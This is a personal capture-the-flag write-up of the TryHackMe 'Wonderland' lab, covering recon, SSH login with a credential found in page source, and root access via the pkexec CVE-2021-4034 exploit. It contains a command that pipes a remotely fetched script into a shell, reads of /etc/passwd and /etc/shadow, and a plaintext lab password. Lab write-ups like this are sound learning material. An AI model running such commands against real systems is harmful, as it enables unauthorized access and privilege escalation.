## TryHackMe - Wonderland
> Completed 5th August  2022.

A fun Alice in Wonderland themed box that gives you no walkthrough and allegedly offeres different routes for completion.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Gobuster
- Linpeas.sh ([source](https://github.com/carlospolop/PEASS-ng))
- ExploitDB
- Nessus

---
### Methodology
#### Objectives/Flags
1. user.txt
2. root.txt

---
#### Reconnaissance
First step was to check the target for open ports using `Nmap`.
```bash
nmap -T4 -sV <TargetIP>
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can see an open HTTP port, we navigate to the IP address using a web browser.
```
http://<TargetIP>/
```
We are met with a very simple Alice in Wonderland themed website with nothing particularly interesting in the source code. At this point I kicked `Gobuster` into gear targetting the address and using my go-to directory wordlist `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/).
```bash
gobuster dir -u http://<Target-IP> -w <wordlist> > <outputfile> -t 100
```
After a a brief moment two directories are found.
```
http://<TargetIP>/poem/
http://<TargetIP>/r/
http://<TargetIP>/img/
```
The subdirectory `/poem` leads us to a simple page displaying an Alice in Wonderland related poem while `/r` takes us to a page with a snippit of the book with an interesting title hinting us to 'Keep going'. From past experience, this was going to be a work spelled out as subdirectories. I continue forward and spell out 'rabbit' being sure to check each index.html for hints in the source code.
```
http://<TargetIP>/r/a/b/b/i/t
```

![](/TryHackMe/Wonderland/images/wonderland_001.jpg)

At this page the source code appears to have a hidden paragraph with the following clue.
```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
In addition to the clue, the page had the following quote.
```
"In that direction, lives a Hatter: and in that direction, lives a March Hare. Visit either you like: they’re both mad."
```
This gave me a feeling that there would be different possible paths to take inside the box most likley involving user's named along the lines of `hatter` and `hare`.

At this point I continued to enumerate the site using `Gobuster` at the different subdirectories to find additional clues and perhapse a way to move forward. While this was happening I researched the clue to see if it would offer me some other keywords or ideas on proceeding. 

#### Weaponization 
N/A

#### Delivery
N/A

#### Exploitation
After turning up nothing of value I decided to try and SSH into the machine using the clue and a username and password.
```bash
ssh <TargetIP> -l alice
	password: HowDothTheLittleCrocodileImproveHisShiningTail
```
I was surprised to find that this worked off the bat. 
```bash
id
  uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
At this point I got to work searching for loot and information of interest.
```bash
cat /etc/passwd
  tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
  alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
  hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
  rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
```
We can see that there are 4 users of interest including `alice`. `hatter`, `rabbit` and `tryhackme`. None of their home directories

```bash
ls -l
  -rw------- 1 root  root     66 May 25  2020  root.txt
  -rw-r--r-- 1 root  root   3577 May 25  2020  walrus_and_the_carpenter.py
```
I was surprised to find the root flag in this user's directory howver we didn't have the permissions to print it to screen. The python file when printed to the screen didn't offer anything in terms of progress but would contain an additional Alice in Wonderland themed story. The following snippit is from that file.
```python
import random
poem = """The sun was shining on the sea..."""
for i in range(10):
  line = random.choice(poem.split("\n"))
  print("The line was:\t", line)
```
Using a command I'd found previously, I searched the host for any files in which the `alice` user would have access to.
```bash
alice@wonderland:~$ find / -perm -u=s -type f 2>/dev/null
```
```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/bin/fusermount
/bin/umount
/bin/ping
/bin/mount
/bin/su
```
From this output, I couldn't spot any unique binaries of interest however I had a feeling my next move was going to be there. I tested the `wget` and `curl`,  commands to see if they were accessible for the user-- which they were. I got to work trying to get `Linpeas.sh` onto the target to get a vulnerability scan going. On my local machine I started up a python3 based HTTP server.
```bash
python3 -m http.server 4443 --directory <sharedfile>
```
On the target machine I requested the Linpeas file.
```bash
curl http://<LocalIP>/linpeas.sh | sh
```
The script got to work and I analysed it's output data. What stuck out most was the following CVE check.
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034 
```
Checking `ExploitDB` for the CVE told me that the target was going to be vulnerabily for a PolicyKit priveledge escallation. While the database entry explained how the vulnerability worked and how it could be exploited, I wasn't experienced enough to know how to employ that within my target's environment. Remembering/testing that `python3` worked for the user, I looked online for a python script adaptation of the exploit. Fortunately I found what I was looking for [here](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py). Running my eyes over the file I couldn't fully interperate what it was trying to do but could understand it was trying to do something similar to the database entry found earlier. I copied out the script and got it onto the target.
```bash
sudo nano cve.py
  <paste script>
  ctrl+o
```
I executed the script
```bash
python3 cve.py
```
```bash
id
uid=0(root) gid=1001(alice) groups=1001(alice)
```
We've succesffuly gained root. I got to work resurfing the user directories for loot.
```bash
cd /home/alice
cat root.txt
```
We've got our root.txt flag. I continued searching.
```bash
cd /home/hatter
cat password.txt
```
In this text file I find what I believe is a password which we copy locally incase it's needed any point.
```bash
ls -l /home/rabbit
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
```
A file of intrest. When this binary is run, the following output is returned.
```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 05 Aug 2022 02:35:31 +0000
Ask very nicely, and I will give you some tea while you wait for him
[expects input]
Segmentation fault (core dumped)
```
I took this as a missed puzzle that could have been used for an alternative means of priviledge escallation.
```bash
cat /etc/shadow
  <redacted>
```
Lastly I wanted to find the last flag so I took a shortcut and used a search command to practice.
```bash
find . -name 'user.txt'
```
The last flag was going to be in /root/ which was the last sub directory to check.
```bash
cd /root
cat user.txt
```
With the last flag found, we've completed the box.

---
### After-action
#### What I've learned
This box was interesting however I felt as though the use of `Linpeas` made it too easy, especially if there was allegedly different routs to take to access the other users. For purpose of learning, I wanted to understand how the script found that the CVE so that in future I wouldn't need to entirely rely on it.

The CVE itself was for a `PolicyKit` vulnerability. From past experience the `PolicyKit` was based on the `pkexec` binary which had turned up in my initial seach for files of interest assessible to the user `alice`. The [database entry](https://www.exploit-db.com/exploits/50689) listed the `PolicyKit-1` version as `0.105-31`. While on the box I ran the following command to find the version.
```bash
pkexec --version
  pkexec version 0.105
```
With this I found that by manually checking version, I'll have a better chance at finding vulnerabilities by searching for them online/on ExploitDB for possible exploits. I will need to practice this method to become more familiar with this strategy.

As an alternative strategy, I fired up the Nessus vulnerability scanner and ran a basic scan of the host using the ssh credentials for the `alice` user. There was a large number of critical vulnerabilities that could be explored but I found the same CVE which tells me that this is another method that could be sed.

#### What I would've done differently
If I was  to do this box again, I would try to lean on Linpeas less and practice manually checking for binary versions and corresponding exploits. I think the box would have been more enjoyable to find the different paths that could probably have been taken, I refer to the binary file that I found in the `rabbit` home directory.